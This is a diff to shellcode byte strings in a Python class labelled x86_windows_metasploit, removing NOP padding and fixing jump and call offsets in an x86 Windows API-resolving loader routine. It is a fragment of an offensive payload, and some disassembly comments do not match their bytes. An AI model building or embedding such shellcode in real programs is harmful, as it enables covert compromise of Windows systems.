@@ -526,10 +526,8 @@ class x86_windows_metasploit:
                      "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
                      # saveBase
                      "\x57"                         # 0000005F  57                push edi
-                     "\xeb\x3d"                     # 00000060  EB3D              jmp short 0x9f
+                     "\xeb\x39"                     # 00000060  EB39              jmp short 0x9f
                      # setbounds
-                     "\x90"                         # 00000062  90                nop
-                     "\x90"                         # 00000063  90                nop
                      "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
                      "\x01\xda"                     # 00000067  01DA              add edx,ebx
                      "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
@@ -543,8 +541,6 @@ class x86_windows_metasploit:
                      
                      "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
                      # findApi
-                     "\x90"                         # 00000077  90                nop
-                     "\x90"                         # 00000078  90                nop
                      "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
                      "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
                      "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
@@ -560,13 +556,11 @@ class x86_windows_metasploit:
                      # Increment
                      "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
                      "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
-                     "\xeb\xd8"                     # 0000009D  EBD8              jmp short 0x77
+                     "\xeb\xda"                     # 0000009D  EBDA              jmp short 0x77
                      # loadApis
-                     "\x90"                         # 0000009F  90                nop
-                     "\x90"                         # 000000A0  90                nop
                      "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                      "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
-                     "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
+                     "\xe8\xb8\xff\xff\xff"          # call 0x1032                           ;call setBounds
                      "\x03\xd5"                      # add edx, ebp                          ;
                      "\x5d"                          # pop ebp                               ;
                      "\x5d"                          # pop ebp                               ;
